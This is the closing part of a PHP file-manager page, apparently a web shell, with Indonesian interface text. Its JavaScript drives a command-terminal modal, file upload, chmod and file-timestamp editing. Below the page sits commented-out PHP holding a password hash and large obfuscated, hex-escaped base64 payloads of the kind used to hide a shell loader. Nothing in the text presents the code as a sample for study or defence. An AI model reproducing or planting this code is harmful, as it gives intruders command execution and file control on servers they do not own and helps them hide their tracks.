    const toggleDarkModeButton = document.getElementById('toggle-dark-mode');
    const body = document.body;
    if (toggleDarkModeButton) { toggleDarkModeButton.addEventListener('click', () => { body.classList.toggle('dark-mode'); const isDarkMode = body.classList.contains('dark-mode'); document.cookie = "dark_mode=" + (isDarkMode ? "enabled" : "disabled") + ";path=/;max-age=" + (60*60*24*365) + ";samesite=lax"; }); }
    function showModal(modalId) { const modal = document.getElementById(modalId); if(modal) modal.style.display = "flex"; if(modalId === 'terminalModal') { const cmdInput = document.getElementById('terminal_command'); if(cmdInput) { cmdInput.focus(); cmdInput.selectionStart = cmdInput.selectionEnd = cmdInput.value.length; } } else if (modalId === 'createFolderModal') { const folderNameInput = document.getElementById('folder_name_modal'); if(folderNameInput) folderNameInput.focus(); } else if (modalId === 'createFileModal') { const fileNameInput = document.getElementById('file_name_modal'); if(fileNameInput) fileNameInput.focus(); } else if (modalId === 'renameModal') { const newNameInput = document.getElementById('new_name_rename'); if(newNameInput) { newNameInput.focus(); newNameInput.select(); }} else if (modalId === 'chmodModal') { const permsInput = document.getElementById('permissions_chmod'); if(permsInput) permsInput.focus(); } else if (modalId === 'editTimeModal') { const dtInput = document.getElementById('datetime_edit_time'); if(dtInput) dtInput.focus(); }}
    function closeModal(modalId) { const modal = document.getElementById(modalId); if(modal) modal.style.display = "none"; }
    document.querySelectorAll('.modal').forEach(modal => { modal.addEventListener('click', function(event) { if (event.target === this) { closeModal(this.id); } }); });
    document.addEventListener('keydown', function(event) { if (event.key === "Escape") { document.querySelectorAll('.modal').forEach(modal => closeModal(modal.id)); } });
    function showRenameModal(oldName) { document.getElementById('old_name_rename').value = oldName; document.getElementById('new_name_rename').value = oldName; showModal('renameModal'); }
    function showChmodModal(itemName, currentPerms) { document.getElementById('item_chmod').value = itemName; document.getElementById('chmod_item_name_display').textContent = itemName; document.getElementById('permissions_chmod').value = currentPerms; showModal('chmodModal'); }
    function showEditTimeModal(itemName, currentDatetime) { document.getElementById('item_edit_time').value = itemName; document.getElementById('edit_time_item_name_display').textContent = itemName; document.getElementById('datetime_edit_time').value = currentDatetime; showModal('editTimeModal'); }
    function confirmAction(message) { return confirm(message); }
    const selectAllCheckbox = document.getElementById('select-all-checkbox');
    const fileCheckboxes = document.querySelectorAll('.file-checkbox');
    function selectAllFiles(checked) { fileCheckboxes.forEach(checkbox => checkbox.checked = checked); if(selectAllCheckbox) selectAllCheckbox.checked = checked; }
    if(selectAllCheckbox){ selectAllCheckbox.addEventListener('change', (event) => selectAllFiles(event.target.checked)); }
    fileCheckboxes.forEach(checkbox => { checkbox.addEventListener('change', () => { if(selectAllCheckbox){ let allChecked = true; fileCheckboxes.forEach(cb => { if(!cb.checked) allChecked = false; }); selectAllCheckbox.checked = allChecked; } }); });
    let dropArea = document.getElementById('drop-area'); let fileInputForDrop = document.getElementById('fileElem'); let actualUploadInput = document.getElementById('actual-upload-input'); let uploadForm = document.getElementById('upload-form'); let progressBar = document.getElementById('upload-progress');
    if (dropArea && fileInputForDrop && actualUploadInput && uploadForm) {
        ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => { dropArea.addEventListener(eventName, preventDefaults, false); document.body.addEventListener(eventName, preventDefaults, false); });
        function preventDefaults(e) { e.preventDefault(); e.stopPropagation(); }
        ['dragenter', 'dragover'].forEach(eventName => dropArea.addEventListener(eventName, () => dropArea.classList.add('highlight'), false));
        ['dragleave', 'drop'].forEach(eventName => dropArea.addEventListener(eventName, () => dropArea.classList.remove('highlight'), false));
        dropArea.addEventListener('drop', function(e) { handleFiles(e.dataTransfer.files); }, false); 
        fileInputForDrop.addEventListener('click', (e) => { e.preventDefault(); actualUploadInput.click(); });
        actualUploadInput.addEventListener('change', function() { handleFiles(this.files); });
        function handleFiles(files) { if (files.length === 0) return; let formData = new FormData(); for (let i = 0; i < files.length; i++) { formData.append('files[]', files[i]); } let xhr = new XMLHttpRequest(); xhr.open('POST', uploadForm.action, true); if(progressBar) { progressBar.style.display = 'block'; progressBar.value = 0; } xhr.upload.onprogress = function(event) { if (event.lengthComputable && progressBar) { let percentComplete = (event.loaded / event.total) * 100; progressBar.value = percentComplete; } }; xhr.onload = function() { if(progressBar) progressBar.style.display = 'none'; if (xhr.status >= 200 && xhr.status < 400) { window.location.href = xhr.responseURL; } else { alert('Upload gagal. Status: ' + xhr.status + "\n" + xhr.responseText); } }; xhr.onerror = function() { if(progressBar) progressBar.style.display = 'none'; alert('Terjadi kesalahan saat mengunggah file.'); }; xhr.send(formData); }
    }
    const terminalOutputDiv = document.getElementById('terminal-output'); const terminalCommandInput = document.getElementById('terminal_command'); if (terminalOutputDiv) { terminalOutputDiv.scrollTop = terminalOutputDiv.scrollHeight; }
    const terminalForm = document.getElementById('terminal-form'); if(terminalForm && terminalCommandInput){ terminalCommandInput.addEventListener('keypress', function(e){ if(e.key === 'Enter'){ e.preventDefault(); terminalForm.submit(); } }); }
    let scrollTopBtn = document.getElementById("scrollTopBtn"); window.onscroll = function() {scrollFunction()}; function scrollFunction() { if (document.body.scrollTop > 100 || document.documentElement.scrollTop > 100) { scrollTopBtn.classList.add("show"); } else { scrollTopBtn.classList.remove("show"); } } scrollTopBtn.addEventListener("click", function() { document.body.scrollTop = 0; document.documentElement.scrollTop = 0; });
    document.querySelectorAll('.modal').forEach(modalEl => {
        const observer = new MutationObserver(mutations => {
            mutations.forEach(mutation => {
                if (mutation.attributeName === 'style' && modalEl.style.display === 'flex') {
                    const firstFocusable = modalEl.querySelector('input[type="text"], input[type="password"], input[type="datetime-local"], input[type="url"], input[type="email"], textarea, button:not([disabled])');
                    if (firstFocusable && (modalEl.id === 'createFolderModal' || modalEl.id === 'createFileModal' || modalEl.id === 'renameModal' || modalEl.id === 'chmodModal' || modalEl.id === 'editTimeModal' || modalEl.id === 'terminalModal' )) { 
                        if (modalEl.id === 'renameModal') document.getElementById('new_name_rename')?.select();
                        else firstFocusable.focus();
                    }
                }
            });
        });
        observer.observe(modalEl, { attributes: true });
    });
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('show_logging_settings')) {
        showModal('loggingSettingsModal');
    }
</script>
</body>
</html>


// <?php
// $passnya = '$2a$12$LPVoepO.PaaWifGKavs4W.6N5mzGYJRP9X6y/dIIAfk148JR2z/X.';
// $swc = "Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNz\x434pSi4upI5yUWJxqZhKfkpq\x63n5Kq\x41\x62SzKLVMQ6W4pMR\x41EwlY\x41w\x41\x3d";
// $stt0 = "xse\x41gv34Y5\x2bS\x63vI\x620UNpY9n/29VryssVZI08SOK1\x42d\x2bWSdd\x61ydlWTo46fRTodpm5XVfKMHXSjo73\x62qWSWt9UqstQ9F2WrdeF26\x62\x617xFm\x635SF\x62jmPvqzr1\x41RyfhwspwuiVp\x623X/0w\x61NQwFg3I7wLDrvQwT\x610z\x62roJIT2ok8y2IpoFkN0\x2b0jRGY5qWr8KeX\x41kz\x63rT5Joo6RdlmOm\x2b4VZi\x63MTQw9IYPL36lNIkYG\x43\x61xNI3Y2FoMWuKqpjhvgViLgRRuMyZ2\x41eZpk\x419yKR8O\x42Uye\x41UJ7k5v9\x43406hZpyiqjKj7J8T\x63FeG4\x618TOHeJsyoOOsWv\x432Jv\x437DfNmJ3\x42GJV\x425dgstIwM2eol0Z0KwzoJ6OQl5qQ\x6258tHHeX295Kj\x4159He3dLQhK4inUkI\x2bWs\x2bP20\x42vG5qMu3k3\x4362wv\x62S8MlmEjEKXpR\x61\x63G3\x43uI\x435z1JvRHglViLnY2JYJkZ//GyF\x43\x63Z\x42LIPi90JxWiY\x62\x62jJXe\x429UXGU\x61u\x41r4RS\x41x77lO\x412PmnW\x63\x2bXH\x2by2YT\x63MY/o4y/jLe\x62dt7u51e8GHt\x41s\x43xpq3\x432N9\x61jqlp1jY6l3HL162uEO8J5VH\x431QIFHNfd1H06\x42uii\x611P5xx\x41fdnXDR\x2bDiwjFo\x61zJOz87\x42vmhr5I4mir7zY\x62DiFJkKz9xlYf\x62k\x43n9\x61tOkuhjI\x61P\x63N1P4\x42f0\x63hh\x43tz\x61f\x63PU\x43fdIe0\x63vEiPmdu6xw\x2bEd\x41\x62n\x637GvQMv\x2bdI\x63HD\x637\x63wDQUy01\x2bY\x63IiMOjT/Qw4x74PIMe8O8THHFOq8X1HIiP/994wYzfXPOsSvNKu8v1j\x42jL/t8Rjxh/VfkY\x634r5PD\x63E4\x635XOVDZ4\x63q\x63TF8zyQNFO8sjj4Ll1u\x61g5\x43\x41us5\x41SIEMGe9OW\x41P9\x42t\x43\x42U87eP3\x63wQ6psnorLgw\x43Z3mMwl0wg8QKHuWZuVO9XKh60leuz5uQnJwUNy\x62NmLNEOj7YgQ7FFt/kEvmYv\x61vGqoY/\x43dRgj/V9/PSvRtf5p\x63m\x41m5\x63DUdyOZ\x42JLz\x2bJqnmnMkZMLm\x61egRNlPoL\x63INW7tw\x42mf\x42XWr93MhRnT72Es9rEym6W\x62Ogk4g3yJx/F\x2bwgLMWU4GTyXx21rM\x2b/\x41F\x62EVU\x629FVXXd4h9guY4Glvd\x43\x41\x2bYyZt\x43JjGtw6z\x41\x42XLJ3Dov0JfzR/EW91wxTVm3XG\x63mwW9NV4\x6210hr\x43nzYG4Y7rZOkxxyQKqVDRssOIhQOm1Di\x41\x63O2KgiY9QIhD\x419\x63X\x41Gu\x43QrI\x62ExdQ\x41F\x42JO6n2KN3NsuPyUr0rDrmsjln\x428k8\x2b99413lDWGY4p5G4\x61yOw\x611TrEEdXqp\x62DywJNU\x2bL\x4117kzJ2VSksH3\x42P97IXYNw2gIi4I\x62JMU6\x63VX\x43j\x43ILPp\x42Hr\x62Z2iHXx1Gms\x62sVeh\x42\x43xTluSV9qps7I5J37XK3irtLPEK\x62\x41ORievhNgKVJ9YRW\x2b2G0\x2b0hh4OY\x43/g48MM1RuwS2y8oj7n4l5pl62VG\x62E\x62Og0pW\x63P8DfxiJ44\x62s9t94NSyqX2rxTGZGfS\x62X5KTkloIZ\x63o2wMtjRr\x61O\x61Wy\x41uh\x417r6RonR3QlEp737iZW2j\x63NXSKl8\x43IGF\x610s2gRQSxNv\x43FwREtSvp\x63wdf\x61T69iKo\x2bXukDEUs/DMUP\x63doHFwk\x2bUpYpp0QP\x633nzU\x61oHfY/IjnYXE6S1dMe\x41eLUK7J\x63ffpOIqlQM\x61Sw9\x43JyjJJ6W\x41osK4e\x41MQxRg/ps4it\x41kGLNwrDvvS7k7f6hEV12IOyiJsKqg4uqwlNXMKUhLGjmKNy1\x41\x4372JQ\x61S4WpEHYlD\x61\x611nO2zu6G3P\x41vdlTkIyNyTqF3LUVP5ul\x42dWeuXflS\x628nrUWd\x2blSuWO2gyRqIN\x62L3EXsEHseQR\x41hWh9UiG6j0mEf\x63FOvpflq\x41\x42HLX4sUXLnr/QS6uflENFp4qpwEH6pKOz\x62RyXfxNj\x42MpYSXQ6w1HXSZdSyGUOfF6d1trou7zQ6Xhu\x616gjL/KpPLqfN0z\x41OiwtoMRKRr3UE5S8jm\x61XQ5\x431H\x62sgMWu\x41\x437OxDGDoIYeyJQIoenJ\x63F0V5g\x43sLn\x2bY\x43PPf9Y2womoLRl\x43kuRUWt\x41Qd\x42Hq\x61e0t\x43\x617\x62e4KwlS64InOwOkYmZR5Twh5\x61HePK8ifmvd\x43V\x43hHZO\x62\x63eHUP4Ust\x62YsZ9z4h\x42ZmIZof\x42DSY29\x62M5E0Xejd8L0x\x2b0Q\x434u1Don\x61/FXnhqQ2\x41Q7\x43d8\x43xL2H3\x41rH\x41s\x417zI1izmjtnUrz2SIID0j\x435ztzLS\x61VDvH\x43RdiTQetIW1\x2bHK05plfJ\x62DE\x61ks\x63F3yF4x\x41/F4Gwh\x43fjpT2\x42Lm\x634g2fxX\x41ekvJ4Kw7UknmkQsztG6V\x41p93qxEfFMteFPwZJY1d\x41uki4hlfx\x41V53MJyWizhgl4\x41Z\x41\x61LuM\x42GfRZY2nOnDUvU9jknWM6\x425\x41SQgpRd\x63tI6svhFLvj\x42\x61GEgVfh3\x61hw34o1\x41\x61tx2XDFGfi0mmyMy/\x4142KUS\x61\x41gy\x43gmFKZkMJ5\x425olH\x62td\x2b86Ziy90yG4s4Reod\x63S\x62Fi9uQxuwP5NuKSN\x43UKrky6m\x41FTNxrs9kliRE1ikhlmk\x43joPQ\x43YR\x61Sd9\x2bwdjHpPokJoY\x43\x62/\x43Ot6KWGRYQLpL93lNR\x42q\x43x8Q3IlHPPf/PytFMMfY099jEIHS9utQKL0Ip2\x41Z\x42Kf\x62JduQpKUxmkd2psG\x432Sh1\x43SMnO\x42twn\x42pPqDYWr\x43qF\x2bhe\x42dm7gNN/DKgnvuPHsYG\x61Uf\x2bSgK7l8x\x2beY\x62\x2bieo46ip\x42ohfF\x41\x62gUDLT/do2Z1zZv\x61XkY\x41\x2b/\x63uDL9dDK9h1pOekO7PmtHQ\x61tf\x62uwR9H\x42\x61uX\x43O\x63K27K78/u\x62qT/X7hX\x62x/996fp3RsvTNl4NLMIDoduDkoouIFH\x62Uu\x624mQ6tLKikl\x62TjS88Q\x62k7q9jr1kGpM\x62\x41LORnj/L\x2bOziQWpSV6Sfk5n\x42\x43O5F68L9lT8U6zij2D4\x2b/3Z5hmk\x618gDgF4PszLv66K815K3\x2bomenx79ZIY3nOgygo5SW\x621Kgl3Z1VXq/9q\x42vdIZh\x419SWJD\x42v\x62UHh16HXDr\x62EExm\x2b\x42P4H8yiNLklD\x41Rpky\x63KxF76/gIkj5Iu\x61jNR9EV\x41hsXxs/oEk7T/Npr\x41NRJtr7Q\x63YPrmdxVv7UiqZWKmkRgeV8J\x43v/\x41zMYjj0\x42mksZYwfugq70I7VIk\x62sL\x42\x2b\x415x6DpOqGIgLQsHPgoQRh\x615L6XXrDqUToF1SvWYF52iGE5wx\x63uEr\x42NduUVrjpui3FrDOgnk3wzJ\x63F1y\x43lGINmGrOvqxogQHJIreRDtzoO\x43Ut5J5jm\x41nydZzK\x42G\x62/Dh\x633mLtXK86FE7DG5hnK\x436ZgvKkLPJF0F7untkS\x43K0u\x614Q0Sqd/qp4wI\x4332\x428rXnnIU5\x43\x61iqK\x43F8\x42i2wJ/Rs1\x61UGPifsr/vFn\x4239Z0lR77fPstOOTfq1Pvrx\x63\x63fq\x636EP7JNzlGXx\x2bYJ\x62f7lZ6l\x421\x2bXwYnfyU9sjM5lWoRiQ\x2bZZ\x61\x2bZdoyMtJ918wk\x63\x2bKtq85Gy8\x61/xEuZe8\x2bRmVr\x42M\x63wHPozmRpjPKw339\x2bKI/6GrqQFqQkm6x\x61nJ9J7\x61e/4X2lr00u3sNPrTi2jfslnWv1qOms/Z7Wx44eWns7Ui4OruRMt2mn\x624JGdfe898ePv67NLzmu4TE\x43lXWu\x42t/\x41QPfRT1E\x2buM4N\x62Jo8HW6l9mlR\x43OQ3DqvnT4KTG2/qI4lo2Jj5HQWyuYPP\x63wVuPY3wi5\x42Fz\x62Q6I\x42P1IDYXG\x41WZSEUgyS1LQhi88TH0fSqxKPRFnTeuQJlXOv\x63ep3lxgvzDSJkk6lEWe/S\x413Z\x62\x41n4YXpg7vr3/L46tq5\x42F/tUn9Kx3KlX\x63DprofXklG\x613LsHQ\x61T83tj0kvJ\x61hTy\x62\x41FrDkl\x427/Dlfqs\x62yt\x62h\x2biQmmS7shrexK9RhqQmmZo7K9M3RIp5uhMh5vHM0yYIlkIe55DGh\x63e\x611\x418\x41NhmTX50\x43uHV/JMvLilhosJel3kvKEOvrq0XOiXXpqyfl5L\x43Fw06SYMSwyJ\x41K9P\x42pwuduwM\x61m6zx\x43fFXH5n7ndHUFeR\x62iqr\x61iyPFOxQF8U\x2b6KQpQvj1XNZPIhN\x42p74ndNd/mu6y1vZ1s\x42N\x2b8qt6x7indXZ88yQFQEl\x43\x61Mg\x63ZLIo4\x43FToR9/JHjSIU\x61Mq3P0D0tdLvhH4r7j7FMvt8PEgn\x41xnZkO5lL66h\x63\x62SgOm5twxvFJpDpSz63dD3f8Ekyw39PM5\x41Ew\x41FG\x61Ylo\x410vllHzFOMH6xzhJH9HM\x62IsFgLY/R7L05GHTV\x62gYOEsygdenOyrF\x2bMt7d5u\x629\x611f2eXJOwipRlMmw0yqRnuVLG4\x62El4trqSifODG\x2b/yrgnUpIRXjkkp\x2bSgx4\x41exU3x\x42vk\x63fK5\x41HIY\x63KdGKh6inmtu03hz7GnRMdK3LeZtVKX7q\x2bg9\x62TE\x61iSThQ91\x62NiDhwf\x2b9j3qpoTq88UFhLVNU0LXzGwp0\x61K8TSZ\x41SuIWx\x2btN86ijxJ/4d\x43gjh\x43MHl81mueMuQw\x62\x62LfRM/wLt\x62jmGzkPIX\x62sh/jWiord\x41Dngoo96uf8NOEH\x42ydVnq\x42i\x635JfR4Kr/wFMOt\x415ZzHeWY52pxT\x62LQu\x63zGvkVOJ\x63SYt\x61rFZtR\x432\x42LSl1w86zM62iN\x43nrtXF\x62s2NRHkERj0up8Z\x63XGMVImnMGguR\x61\x2bxsNl\x62f\x2bjnQ\x2bS7\x63OI8JpD\x41litwGIyhr\x63OjQ8TPj8\x2bNxhjxrQunvLtX6h\x620flm/2tDormjYG\x43ryF9\x2bV\x63v5O\x61z5Su33f40orhmf81\x631\x62\x412L\x61fkS\x41np5V\x2b6s3mt3TX\x42tkj59pp6y8Y\x41\x2bpjZGFxuSdP\x41K\x2b2\x2bsKqjtU0yt6mWM7HeHLRRD/eOi974lWPXkDMQTuH487wtu6INhp\x42QEvX6JXj\x42Hlqjh\x43f0I4E9fuQ\x63NhylTE\x63hdQ7ZMnl\x43T\x42H6Z/enXWFdhy5/ru5S3utxyztlWqL8oLKLmQRHZdtvhretYX1\x43LYY1ziKOHY\x63lXHQx3iVN\x63MV\x42\x62wvmjgtGskZ\x63EX\x42WFtxU\x43ihpKZjJLp8MY\x62jfNV/Ls\x61QF//nlWYqh1Y\x2bh7qY9nfu\x2bqP9\x63seFu3omTL\x43LLzupJDN2PROJFE9fz3Em9vSyv\x42w9sdRvPwzES6hGsJdT8/W\x62GKXQD6n4jsypeix3miiJe\x42MZ18/F3wpeiH\x63VH\x43rW\x2bxRlGpmFeji\x43lsjgz\x61k513DupJ87\x420\x62jf\x63k99wI/L5JY9M6G5xzoMorHs\x63D\x63\x61DWo87DhdGp/\x63GdVyYt0T\x61im9v\x2bD\x61\x41eiRNs\x63Z/QR07KsQ3u5wOguz3\x43J\x42I\x61\x63108exF/Uv8vdu/7yff3Of/e00\x2b4JkzexnIjkhr9qe\x62h\x416NFpMdSfT1ZNh2zzuLz\x63mikhp/x\x43OKjK66z\x42uiV\x2bLs\x61k\x41N8Uy4ShlYLV8ZkxdDudQoRDit\x61jE6xT\x62XsjG/\x43VfLKVgp9YunWD7\x62w6Z\x61wxOIql\x43ZL2JYNU6ghyPW9FOI\x41o\x43T2HTpS59Ep\x41/870hvI\x41\x61th34xV4Sn9oIdOuJE5VkD986uj8K\x412Knk4Lvojz3wtpwf/SQ7p4\x41Os/ku4\x43WpRT7Yrul3PVlnt/mPf37f7\x2bfMx4xIPO4ehOYEImjd\x63Ytr1D9x3xrOq1xtGXX\x2b3Vh\x63Eh\x62ttsdl9KeRT\x41IS/ds0\x2bL7UV13ORJ\x43KrvUFIt3yUjDGZp\x614XMz\x62\x43QEjDI\x4278UrSKpsytrF\x41SN\x42Em\x63tXElpmlNVS8yiptdI5Fmpn\x62\x2bSjpiluEh8mqWjNHWTiO5GF4u1U9jVnLXfpFij2dVlRf3gfJ\x432qe\x61Dt02TxW0IdmTkV\x63ungV\x62FNxzulfPJSJ3KmMhDsG7wURSm92222VhW37qUT0N2rGUmfDgW8W/\x63qI4e4gxyW\x43gt9rt51DRqU4q9nWDTk\x61\x61T7WUN\x2bS9W4HwFH\x62j6qiXqSFK\x43WH\x61ts\x2bWIs7K\x63j8o\x41NiQRJD\x41p0erLY8MhqIUVsJsVTf1offguGYxwqDof3q0Y8qtV\x41USOqWe/YZe\x42ReqIruw63iPPpex8DTUk03M\x43iksVj7\x61ogT1mW9wy\x61VsyUxuMlH\x63l5fpZt\x62TnWsGr\x43\x63h3\x41mZqq\x62Dxtdr3QV\x2bK44nLUEdnKg1pxYpfhy\x2b5\x42F\x2b6EKw\x2b9sQ1VnDWxex\x2bqVkj7q4f\x413\x42M\x62o\x61qzML6p7sxNMo\x62VXvNO2ndj\x43Lt\x62F2\x42GtM81SI\x2bKDF5pTeh\x62n9ELfdhwvt\x427xX3Zg\x621Q6\x62Mq/p\x61o/t5ex\x42/Y0q\x43n\x2bn\x63\x61/\x41yt\x61\x63UsymNP2fK7\x431H\x4256tnG3J7wZXPi2RgN5Ylzv8DjsxF\x42o5g\x63wFxuk/uqLjvv\x427i0/\x435\x43FD3fekxzTJP\x2bXYOvLZYim0LfvQz0jT21l2X6KGfgfQw/ixtgk\x2byXQ6\x42y2ERx\x416urPp1ULHGSr2FXvrrHkiMH8zqRvu\x2b6ro3xFyx\x41I/xqGStykO4i\x2bLQ\x2b62TQ\x63wXv\x2bZ2\x436XyLM3\x42diKfZNE4G\x62XNhe8x\x41oH\x42FVV6qf4y0j2LKK3Pl\x62q2GrM\x633i365Q\x63Kyv\x63X0mg\x2bxJop\x41PWzKkzQO/y\x62oYR\x62\x2beNgEPi7r\x62947\x62ykqfmTUXg5KOVRt3/ESKtN3MJ/J\x41e9\x42hT4srLu\x42HqZKfsEfEynr3yw\x63i9guvDZxPYhLnj2kO/\x63fD\x43uG\x63Lf\x42EW3oPS\x2bN5\x631t\x42fDl\x2bI7gnRVXVx\x2bG19KYy86QGWt\x61d\x63Un9\x63l/gSkPz\x62T5lv39gLZqn\x428ly\x43ZxPO\x63rzthRN602jO\x43YytRPy12O6\x429jv\x41v3FUM8/T\x41vwLUv\x43djQF7DtgkOSNHu8XsOHESIITxjj89\x42UPn7KPv5\x4125Vf\x636sxN9\x4146tuL\x61sk74mO\x63\x63Y0P\x41k054TOR\x62Mu5R\x2b5xQgj\x41xF\x62/D\x62g0rju/f/y9mPhomzyY\x41DT0d\x2bi\x63nfP05\x41MPSvEvof\x43\x63w/yo3VK\x43ZM87317Q48PedgD\x42QvLy3vqt\x62Tv0Z2nxg\x2bhXzjP8\x62rve05gLj5JH84w\x62u42\x63KXv4wM\x61Jq/6yZkNtRP5xr/pHSzK\x62\x63\x41zJTTj2iT1w\x62\x422\x42QvT\x2b4\x41QFe\x63Q4d\x42v5rrRF3HY\x2bD\x631\x421/jkR/f\x6249yg\x62LMf9R\x42Xe/\x2bWkiv8RMdT0zR\x61\x2bVP\x63sOtydHwd\x419Y2w09G70D\x419S\x41HWZrg6ZK9Gw0l\x63qy5JwFQr12Vyoz\x41PDW8DFvD\x2bIgj1Y9ZfQUO2pHk1\x62uKUuHYlJqz\x2boM9V4XfO79fZZep15rMRNuL0hINO\x61zWwq\x6280zfQoem\x43xLu8wjO6yIOFW0v\x41VnZ7yxYzDpyO9MI9eR038\x627JM\x2b0V7/o\x62kj\x62g473\x2b9JRVp\x611ohfOg/0XV0Kofd2MzPzx\x41QT\x62edIkHnuKx\x2bH4jU/Xr\x61fj7N9dzK4wEvJEq\x62zFe4jjopTQ\x63\x41nd1stDsHw8L\x2bDHRNXS46v2q86GD11\x61tv\x42eGujp486j\x612nqekyqfHOH\x42\x43pV9Pgf5JKK5\x41ZXHesrE3W\x61qvLYKy4rQyo\x2b3D\x2b\x42o34P7fw1f\x41\x41/\x439\x42wD\x41uNjZo/DJ\x61\x2b0R69GVt19PnSy5uQrpJNwO06mT8L\x2b\x63Y7K\x61no2ETkDT9SjyMDfn\x42\x42I3fPr\x2bq\x62Rfyh\x412P\x43pvMQylvI/o\x2bIH/ifHzdklqJGzkxGrekRu0H\x2bxT\x63G8LmU\x62D\x2b0k\x62\x62\x2bfJ5nn\x43G\x2bK4e97X\x2bz9J/1n395M\x61z7okTfd3HP/mZ5EYQJs8F\x610shjV6gPD8Iy1ZkhoHw0YGH5OniFefFxysR\x424oTd19WsxUfTWO\x42Ghf1\x62O\x61W\x2bI\x61MF\x62o4TQyp\x62q1xX/HMlgpWMIQ\x62Oz/d6PZWL5w\x42uHlVJ\x6337z1\x2bFe5FKH9\x2bEl\x630W29J1\x2bwu6TQNi5hf7KWz\x2bz2lkNmjo/75NmUOvE3tMLhO4yFD\x61IgNe\x63X79lvf\x62D0Zun8\x627Y99t80gf0z\x438JXMlpNMMr2/1H\x63fYe4u\x43l2kz\x41\x2b\x4317zXkt5unlp0OR4WO\x62\x63E40NmXg2\x422MimhGotR\x4147Qmfd47L\x614\x62D\x2bwLvQMJKDg/y\x2btXQ6u\x63jPIHYRMPexW\x43k\x611\x2bn6dI\x63IV9p8Pil86L7qDn/\x2btPZ0H3SF3r5hkYIw1wqLf\x62itukvSfKgnLgliG58z5hYfv/\x43h\x43e0n\x2bGX2PydnSvf75Og2p9H\x63sw0pn\x63Y\x414\x423o1\x63S\x2b\x63\x2bXTt\x62ziPi5LY\x63\x43MqVRX9y\x6158VQl/l\x2bP\x2b7WUT2w3jPUhk7I6\x2b3s0PQ/x1\x63SQT8K5sfEmGH5T7\x42oHSjyiUOsKkfgo/w9fjU\x6327yuH/01f6Sv/pvd0n0DO\x2buK\x41T1\x43mDh553\x41NqNfJwGy2kiSOJ37x8xiqzjL\x41hu2XD\x43M8e8SodWllq/Xwor03rPO5fSf\x43GjQthMHu/sPRy\x438JxHx8W39\x629Tj\x62\x41z\x42Q\x2b\x632vzvy6eQd4z9i\x61Q\x41\x2bks\x41k\x617N8I\x41Pj7izO\x62MZfTEJj1tYryi7koHp7Y5N\x2bZkejv9ml\x61dlwus/tM/N\x42ZvPvEyP\x61j/Eikn\x41fm73lwYKweVnsEiL9\x63SM/iFWY1n\x2bzidMNnu\x61Oo\x41s6rz\x61dQhxwyP89de93jYdH4VxSjf\x61/P\x2bMvE2L6hPn3hfNDV/r\x41\x2bpLvgxdO4kVd6pX\x2b3W\x61LSG\x42v4H\x2b\x61umSZZgKd/\x42qydsd45mniDv\x6136Puei/lDuG7wy\x42OdYE\x63wT38\x42r\x416qOfzNoqjsgfPtdkLpX\x42MO6LSGkHT\x2bgZ\x61IN2ZqoV\x2b6Lx3Zr0qOs/UwOTdGUWi39smFDM\x2bWrwLuor\x2b4Te9nr865SsfLS4I0ejkU\x61Ur50\x636yPmS5f\x2bG\x63SDo6jXR1/\x61\x61DrXLwlXt5HRl/e\x61R5N6zVxZ\x410p48yrW/Df\x62\x63Ju4PZ4Mj1NI\x2b4r\x2buwoiPP/1OPugzPM5n2s3ygu/hv\x61RX\x614n\x2bzKNhy4\x62y0wWwG7FU6PO\x63dE1175U\x416TJ\x622xHV6\x613r\x419K\x61W6v/10S1uQ863E055LuWfYYu\x42DK\x2bl4vw2\x42Rfe\x2bm3nykTPUle\x63u/\x2by\x62G\x2bG9mX\x418Ftv\x416Mq/xU60v2yl\x618/kep2FX\x43ZEQny8NmfX552D/3l5FW78FE9O044q0XRtn7T6V3\x2bU06Xrm\x62t\x41yOy/OlXp\x2bmz\x41j9xrfXrK3z2T6wuH/O9\x62V5LvOgf\x41RVeOmNe\x2be\x62\x6235p\x2b0W\x2bjW3HWPSODO0hfxpX5p\x63sTXqOX5Hnz5IPGlRrNf3g2F/d\x42\x2bwnv9kX87EE34ve\x42nH4Gx\x63gS18FqO9K9hjre8l/vFI9fENP732W9s7DvHvho7zwz\x43WPh\x62Lk\x2btlgOG\x61zhnSrDn1Grr\x426wrp\x62rH6uL\x4170jX\x62oFkmP\x2bf9t\x41RSle69\x61/F4niRmszPdKhrV\x63/TH\x2b6p\x437\x43tq7\x2bpZ\x62n84OV\x63q21npdD3Dh1\x63m\x432GrM4E\x2b7J\x427D5SSf\x62ouF\x61P/6Gh5ZmN8OShXt/ezdk5N\x42muKp\x63n\x63sTXxp\x61\x63z2\x2bMhLhuWN/x6Y4FMz2nMZ\x62TLfjP1290zhRyxwj\x41Ytzvn\x4318go\x2b1\x42X5mLPp6U/\x63/Jdi\x63Ve\x42N1fS\x42SeXXg6Lou\x61s6\x43k6zT2\x62W\x2b22T0h\x62682jwgFf7xGhsl\x62Y7Jjh8m\x4105Ufy\x61fSH6o71ZZ/NGyrgtTFZII9kDrgXv7wPPSDe8niKtuvG9Gq1OTtHw8iXrG\x2bitq3NO2p9hulsSnX\x41hJf/\x423\x43slz\x41\x62d\x63E15t\x42\x2bve4tgLy97ZVHwm\x62WMwV\x62t559KHjx6Tf9n3e\x42x1oFv\x43\x2bHG90x\x63iq\x63K\x63XV1\x62XgRN\x63\x427eth\x42xI\x61\x2bPH\x41fE5DM\x43m9IotDK341y6\x62\x41X\x62H8S98n\x41R7F\x2btsryvJd6Og24d1q\x412PoVyT\x425634PR6I9lP8/LQntXle0VXRfzVNi/O\x63\x4334WeijhxdL8FYsMDrduG96JX\x637eXx1ZrOGkz1u98UeeLq\x630m\x62Muj\x43l26Zf\x633Jn8QryWPHSq9s3OSz3kxPZxnDv8qDt1jPd3Pd0p\x61xPiv3r\x62X4FNwvR7Jt07gztW4ZK60XP/t7X4\x2bzKmryr2V8F26HzjXu\x625nt29fO7iD265XqlXOXP\x6111e\x62mnJ6Rvx4TWMV\x2boTfQtPhp\x63U8pPv7xr/RPoGff\x61UM7\x62nt3t\x61YeG\x41I7hw1HyV\x42\x2b4XFtu\x62\x61OxneyRPe1HWjP6UdYo\x6202\x613pE\x2b\x4379xz6ux4rr6\x62eK3f\x42d\x43qFdgyxhV/3pjv8Zguh0IK\x2bGo\x42TrfFSK9Dlemiv8mN8qTP4GXu1duxRo3i3/E\x62\x61V\x629l\x63\x2b69o1X\x63fitOd\x62jyege/U52j1Ydf\x2b\x41vL26dr1d6UR\x62\x2bRnrnN8